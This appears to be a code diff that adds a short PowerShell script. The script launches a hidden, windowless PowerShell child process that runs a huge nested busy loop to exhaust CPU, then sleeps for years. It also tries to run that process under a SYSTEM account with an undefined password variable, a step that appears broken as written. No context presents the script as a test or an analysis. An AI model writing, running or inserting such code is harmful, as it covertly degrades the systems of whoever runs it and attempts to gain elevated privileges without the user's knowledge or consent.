@@ -1,0 +1,10 @@
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = "powershell.exe"
+$process.StartInfo.Arguments = "-NoProfile -WindowStyle Hidden -Command &{1..100000 | % {1..100000 | % {1}}} ; sleep 99999999"
+$process.StartInfo.UseShellExecute = $false
+$process.StartInfo.RedirectStandardOutput = $true
+$process.StartInfo.RedirectStandardError = $true
+$process.StartInfo.CreateNoWindow = $true
+$process.StartInfo.UserName = "$env:COMPUTERNAME\SYSTEM"
+$process.StartInfo.Password = $SecurePassword
+$process.Start()
